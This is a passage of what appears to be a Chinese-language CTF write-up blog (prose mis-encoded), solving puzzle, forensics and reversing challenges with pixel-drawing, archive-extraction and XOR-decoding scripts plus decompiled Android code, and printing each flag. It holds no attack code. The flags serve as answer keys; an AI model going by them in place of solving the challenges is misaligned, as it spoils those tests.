<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">12</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>], [<span class="number">19</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">7</span>], [<span class="number">19</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">7</span>], [<span class="number">17</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">31</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">32</span>], [<span class="number">17</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">31</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">32</span>], [<span class="number">17</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">67</span>, <span class="number">1</span>, <span class="number">32</span>], [<span class="number">120</span>], [<span class="number">21</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>], [<span class="number">120</span>], [<span class="number">120</span>]]</span><br><span class="line">img = PIL.Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">120</span>, <span class="number">35</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line">column, row = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pixelLine <span class="keyword">in</span> pixels:</span><br><span class="line">    <span class="keyword">for</span> pixel <span class="keyword">in</span> pixelLine:</span><br><span class="line">        <span class="keyword">if</span> pixel &gt; <span class="number">1</span>:</span><br><span class="line">            column += pixel</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel((<span class="built_in">int</span>(column), <span class="built_in">int</span>(row)), (<span class="number">16</span>, <span class="number">63</span>, <span class="number">145</span>))</span><br><span class="line">            column += <span class="number">1</span></span><br><span class="line">    row += <span class="number">1</span></span><br><span class="line">    column = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">img.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618575459372/a2b83c35d6d56a65ce6295a7f805dac141f8fe08.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;93ids_sk23a_p1o23&#125;</span><br></pre></td></tr></table></figure><h3 id="NPUCTF2020-å›æ”¶ç«™"><a href="#NPUCTF2020-å›æ”¶ç«™" class="headerlink" title="[NPUCTF2020]å›æ”¶ç«™"></a>[NPUCTF2020]å›æ”¶ç«™</h3><p>AccessData FTK Imager æŒ‚è½½é™„ä»¶ç»™å‡ºçš„ç£ç›˜ï¼Œåœ¨ <code>X:\Windows\Web\Wallpaper\Windows</code> ä¸‹å¯ä»¥æ‰¾åˆ° flagã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå›æ”¶ç«™å†…ä¹Ÿæœ‰éƒ¨åˆ† flag ä½†æ˜¯å¹¶ä¸å®Œæ•´ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618662295762/4d0b2761731eb998e3b34261333b8d9ac08be468.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e10adc3949ba59abbe56e057f20f883e&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2018-42-tar-xz"><a href="#INSHack2018-42-tar-xz" class="headerlink" title="[INSHack2018]42.tar.xz"></a>[INSHack2018]42.tar.xz</h3><p>å¥—å¨ƒè§£å‹å‹ç¼©åŒ…å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618671289024/b2b2d57eda92a084a56ba7b0e71d0bf1eb2c4e68.png"></p><p>ä¹Ÿå¯ä»¥è„šæœ¬ä¸€æŠŠæ¢­ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> [ <span class="string">&quot;`find . -type f -name &#x27;*.tar.xz&#x27; | wc -l`&quot;</span> -gt 0 ]; </span><br><span class="line"><span class="keyword">do</span> find -<span class="built_in">type</span> f -name <span class="string">&quot;*.tar.xz&quot;</span> -<span class="built_in">exec</span> tar xf <span class="string">&#x27;&#123;&#125;&#x27;</span> \; -<span class="built_in">exec</span> rm -- <span class="string">&#x27;&#123;&#125;&#x27;</span> \;; </span><br><span class="line"><span class="keyword">done</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;04ebb0d6a87f9771f2eea4dce5b91a85e7623c13301a8007914085a91b3ca6d9&#125;</span><br></pre></td></tr></table></figure><h3 id="SWPU2019-Android1"><a href="#SWPU2019-Android1" class="headerlink" title="[SWPU2019]Android1"></a>[SWPU2019]Android1</h3><p>è§£å‹æ–‡ä»¶ä¹‹åå‘ç°ä¸€ä¸ªåº“ï¼Œä½¿ç”¨ IDA æ‰“å¼€å¯ä»¥å‘ç°å››ä¸ªå¥‡æ€ªçš„å‡½æ•°ï¼Œå…¶ä»£ç æ•´ç†åå¦‚ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">aa</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">3</span>]; <span class="comment">// [rsp+11h] [rbp-Fh]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = &#x27;R_C&#x27;;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i )</span><br><span class="line">    v2[i] = *((_BYTE *)&amp;v3 + i) ^ <span class="number">0x37</span>;</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v4 )</span><br><span class="line">    result = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">aA</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">3</span>]; <span class="comment">// [rsp+11h] [rbp-Fh]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = &#x27;AVE&#x27;;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i )</span><br><span class="line">    v2[i] = *((_BYTE *)&amp;v3 + i) ^ <span class="number">0x24</span>;</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v4 )</span><br><span class="line">    result = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">Aa</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">3</span>]; <span class="comment">// [rsp+11h] [rbp-Fh]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = &#x27;MWa&#x27;;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i )</span><br><span class="line">    v2[i] = *((_BYTE *)&amp;v3 + i) ^ <span class="number">0x38</span>;</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v4 )</span><br><span class="line">    result = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">AA</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">3</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+17h] [rbp-9h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = &#x27;#$D5&#x27;;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">    v2[i] = *((_BYTE *)&amp;v3 + i) ^ <span class="number">0x77</span>;</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v5 )</span><br><span class="line">    result = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™ä¸ªè„šæœ¬è·‘å‡ºç»“æœã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> aa = <span class="string">&quot;R_C&quot;</span>; <span class="comment">//0x37</span></span><br><span class="line">    <span class="built_in">string</span> aA = <span class="string">&quot;AVE&quot;</span>; <span class="comment">//0x24</span></span><br><span class="line">    <span class="built_in">string</span> Aa = <span class="string">&quot;MWa&quot;</span>; <span class="comment">//0x38</span></span><br><span class="line">    <span class="built_in">string</span> AA = <span class="string">&quot;#$D5&quot;</span>; <span class="comment">//0x77</span></span><br><span class="line">    <span class="built_in">string</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> c : AA)&#123;</span><br><span class="line">        result += c ^ <span class="number">0x77</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> c : aa)&#123;</span><br><span class="line">        result += c ^ <span class="number">0x37</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> c : aA)&#123;</span><br><span class="line">        result += c ^ <span class="number">0x24</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> c : Aa)&#123;</span><br><span class="line">        result += c ^ <span class="number">0x38</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    reverse(result.begin(),result.end());</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;YouaretheB3ST&#125;</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2020-toast-clicker1"><a href="#BSidesSF2020-toast-clicker1" class="headerlink" title="[BSidesSF2020]toast-clicker1"></a>[BSidesSF2020]toast-clicker1</h3><p>ä½¿ç”¨ jadx åç¼–è¯‘é™„ä»¶å¯å¾—åˆ°å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] input = &#123;<span class="number">67</span>, <span class="number">83</span>, <span class="number">68</span>, <span class="number">120</span>, <span class="number">62</span>, <span class="number">109</span>, <span class="number">95</span>, <span class="number">90</span>, <span class="number">92</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">73</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">92</span>, <span class="number">80</span>, <span class="number">89</span>, <span class="number">81</span>, <span class="number">104</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">printfirstFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String output = BuildConfig.FLAVOR;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] iArr = <span class="keyword">this</span>.input;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= iArr.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> output;</span><br><span class="line">        &#125;</span><br><span class="line">        output = output + Character.toString((<span class="keyword">char</span>) (iArr[i] + 